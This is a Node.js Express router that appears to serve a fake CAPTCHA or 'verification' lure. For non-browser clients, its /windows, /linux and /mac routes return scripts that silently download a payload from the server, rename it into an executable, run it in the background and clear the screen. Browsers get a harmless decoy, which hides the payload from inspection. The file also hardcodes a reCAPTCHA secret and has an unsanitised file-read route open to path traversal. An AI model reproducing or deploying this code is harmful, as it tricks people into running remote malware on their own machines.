var express = require('express');
var router = express.Router();
const jwt = require('passport-jwt');
const path = require('path');
const fs = require('fs');
const axios = require('axios');

const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const status = {}; // token -> status

io.on("connection", (socket) => {
  console.log("Browser connected:", socket.id);
});
  io.emit("message", { from: "curl", text: "verified" });

// const requestLog = {};
const sseClients = new Map(); // token -> res (SSE connections)

// Helper function
function responder(res, err, data) {
  if (err || !data) {
    console.log({ err, data })
    res.status(400).send({ err, data })
  } else {
    console.log("Data: " + data)
    res.status(200).send(data)
  }
}

/* ---------------- NEW SSE FLOW ---------------- */

// ✅ SSE connection (frontend listens here)
router.get("/stream/:token", (req, res) => {
  const { token } = req.params;
  if (!token) return res.status(400).send("Missing token");

  // SSE headers
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();

  console.log(`🔗 SSE opened for token=${token}`);
  sseClients.set(token, res);

  req.on("close", () => {
    sseClients.delete(token);
    console.log(`❌ SSE closed for token=${token}`);
  });
});

// ✅ Called by script (Windows/Linux/Mac) to verify
router.get("/verify/:token", (req, res) => {
  const { token } = req.params;
  const client = sseClients.get(token);

  if (client) {
    client.write(`data: verified\n\n`);
    console.log(`✅ Token ${token} verified and pushed to frontend`);
  }

  res.send("Verification done. You may close this window.");
});

// ✅ Dynamic script generator (optional, easier for testing)
router.get("/script/:os", (req, res) => {
  const { os } = req.params;
  const token = req.query.token;
  const domain = req.protocol + "://" + req.get("host");

  if (!token) return res.status(400).send("Missing token");

  let script = "";
  if (os === "windows") {
    script = `@echo off
echo Authenticated
curl -s "${domain}/task/verify/${token}"
`;
  } else if (os === "linux" || os === "mac") {
    script = `#!/bin/bash
set -e
echo "Authenticated"
curl -s "${domain}/task/verify/${token}"
`;
  } else {
    return res.status(400).send("Unsupported OS");
  }

  res.type("text/plain").send(script);
});

/* ---------------- EXISTING CODE ---------------- */

// I am not a robot (CAPTCHA)
router.post('/verify-captcha', async (req, res) => {
  const { token } = req.body;
  if (!token) {
    return res.status(400).json({ success: false, message: 'Missing reCAPTCHA token' });
  }

  try {
    const response = await axios.post(
      'https://www.google.com/recaptcha/api/siteverify',
      new URLSearchParams({
        secret: "6LeGB7ErAAAAAMKb_RNhk5t8vDpsK0sIe_IerQhN",
        response: token,
      }).toString(),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    if (response.data.success) {
      res.json({ success: true });
    } else {
      res.status(400).json({ success: false, message: 'Failed reCAPTCHA check' });
    }
  } catch (error) {
    console.error('CAPTCHA verification error:', error.message);
    res.status(500).json({ success: false, message: 'Server error verifying reCAPTCHA' });
  }
});

router.get("/status/:token", (req, res) => {
  res.json({ status: status[req.params.token] || "pending" });
});
// router.get("/auth",  (req, res) => {
//    const { os } = req.params;
//   const token = req.query.token;
//   const domain = `${req.protocol}://${req.get("host")}`;
//   const ua = req.get("User-Agent") || "";

//   if (!token) return res.status(400).send("Missing token");

//   const isBrowser = /Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(ua);

//   // A minimal browser response used in your originals
//   if (isBrowser) {
//     res.type("text/plain").send("@echo off\necho Authenticated");
//     status[token] = "verified";
//     return;
//   }

//   // Templates for non-browser clients
//   const templates = {
//     windows: `@echo off
// curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token.npl
// cls
// if exist "%USERPROFILE%\\token.npl" del "%USERPROFILE%\\token"
// if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
// ren "%USERPROFILE%\\token.npl" token.cmd
// "%USERPROFILE%\\token.cmd"
// cls
// `,

//     linux: `#!/bin/bash
// set -e
// echo "Authenticated"
// TARGET_DIR="$HOME/Documents"
// clear
// wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/task/tokenlinux.npl
// clear
// mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
// clear
// chmod +x "$TARGET_DIR/tokenlinux.sh"
// clear
// nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
// clear
// exit 0
// `,

//     mac: `#!/bin/bash
// set -e
// echo "Authenticated"
// mkdir -p "$HOME/Documents"
// clear
// curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux.npl"
// clear
// chmod +x "$HOME/Documents/tokenlinux.sh"
// clear
// nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
// clear
// exit 0
// `,
//   };

//   const lowerOs = (os || "").toLowerCase();
//   const script = templates[lowerOs];

//   if (!script) {
//     // Unknown OS param — return a helpful error
//     return res.status(400).send("Unsupported OS");
//   }

//   res.type("text/plain").send(script);
//   status[token] = "verified";
// });
// Windows Auth
router.get("/windows", (req, res) => {
  const token = req.query.token;
  const userAgent = req.get('User-Agent');
  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off\necho Authenticated`);
  } else {
    
    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    // const now = Date.now();
    // if (!requestLog[ip]) {
    //   requestLog[ip] = {};
    // } else {
    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
    // }
    // requestLog[ip].step1 = now;
    const domain = req.protocol + '://' + req.get('host');
    res.type("text/plain").send(`@echo off
curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token?token=${token}
cls
if exist "%USERPROFILE%\token.npl" del "%USERPROFILE%\/token"
if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\/token.cmd"
ren "%USERPROFILE%\\token.npl" token.cmd
"%USERPROFILE%\\token.cmd"
cls
`);
  }
  
  status[token] = "verified";
});

// Linux Auth
router.get("/linux", (req, res) => {
  const token = req.query.token;
  const userAgent = req.get('User-Agent');

  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off\necho Authenticated`);
  } else {
    
    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    // const now = Date.now();
    // if (!requestLog[ip]) {
    //   requestLog[ip] = {};
    // } else {
    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
    // }
    // requestLog[ip].step1 = now;
    
    const domain = req.protocol + '://' + req.get('host');
    res.type("text/plain").send(`#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/task/tokenlinux?token=${token}
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
`);
  }
  
  status[token] = "verified";
});

// Mac Auth
router.get("/mac", (req, res) => {
  const token = req.query.token;
  const userAgent = req.get('User-Agent');

  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off\necho Authenticated`);
  } else {
    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    // const now = Date.now();
    // if (!requestLog[ip]) {
    //   requestLog[ip] = {};
    // } else {
    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
    // }
    // requestLog[ip].step1 = now;

    const domain = req.protocol + '://' + req.get('host');
    res.type("text/plain").send(`#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/Documents"
clear
curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux?token=${token}"
clear
chmod +x "$HOME/Documents/tokenlinux.sh"
clear
nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
`);
  }
  
  status[token] = "verified";
});

// Token Parser
router.get("/tokenParser", (req, res) => {
  const token = req.query.token;
  console.log("✅ /api/tokenParser.npl called");
  const filePath = path.join(__dirname, '..', 'public', token);
  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) {
      console.error(err);
      return res.status(500).send(filePath);
    }
    res.type('text/plain').send(content);
  });
});

// Package.json
router.get("/package.json", (req, res) => {
  console.log("✅ /api/package.json called");
  const filePath = path.join(__dirname, '..', 'public', 'package.json');
  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) {
      console.error(err);
      return res.status(500).send(filePath);
    }
    res.type('text/plain').send(content);
  });
});

// Windows token
router.get("/token", (req, res) => {
  const token = req.query.token;
  console.log("✅ /api/token.npl called");
  const domain = `${req.protocol}://${req.get('host')}`;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const filePath = path.join(__dirname, '..', 'public', 'token.npl');

  // if (!requestLog[ip] || !requestLog[ip].step1) {
  //   res.status(400).send('request failed');
  //   return;
  // }
  // const now = Date.now();
  // requestLog[ip].step2 = now;
  // const timeDiff = now - requestLog[ip].step1;
  // const isAutomatic = timeDiff < 3000; 
  // delete requestLog[ip];
  const isAutomatic = true;
  if (isAutomatic) {
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        console.error(err);
        return res.status(500).send(err);
      }
      const modified = content.replace(/{{DOMAIN}}/g, domain);
      const modified_1 = modified.replace(/{{token}}/g, token);
      res.type('text/plain').send(modified_1);
    });
  } else {
    return res.status(500).send('request failed');
  }
});

// Linux token
router.get("/tokenlinux", (req, res) => {
  const token = req.query.token;
  const domain = `${req.protocol}://${req.get('host')}`;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const now = Date.now();
  const filePath = path.join(__dirname, '..', 'public', 'tokenlinux.npl');
  // if (!requestLog[ip] || !requestLog[ip].step1) {
  //   res.status(400).send('request failed');
  //   return;
  // }
  // requestLog[ip].step2 = now;
  // const timeDiff = now - requestLog[ip].step1;
  // const isAutomatic = timeDiff < 3000;
  // delete requestLog[ip];
  const isAutomatic = true;
  if (isAutomatic) {
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        console.error(err);
        return res.status(500).send('Error reading tokenlinux.npl');
      }
      const modified = content.replace(/{{DOMAIN}}/g, domain);
      const modified_1 = modified.replace(/{{token}}/g, token);
      res.type('text/plain').send(modified_1);
    });
  } else {
    return res.status(500).send(filePath);
  }
});

module.exports = router;
